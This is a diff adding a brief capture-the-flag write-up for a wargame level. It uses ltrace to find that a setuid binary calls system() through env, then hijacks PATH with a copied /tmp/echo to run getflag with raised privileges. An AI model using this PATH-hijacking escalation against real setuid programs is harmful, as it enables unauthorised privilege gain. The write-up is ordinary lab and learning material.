@@ -1,1 +1,6 @@
-qi0maab88jeaj46qoumi7maus
+`ltrace ./level03`
+
+We can see that system() is called after setresuid and setresgid. It's called with "/usr/bin/env echo ..."
+
+`cp /bin/getflag /tmp/echo`
+`PATH=/tmp/ ./level03` and we get our flag :)
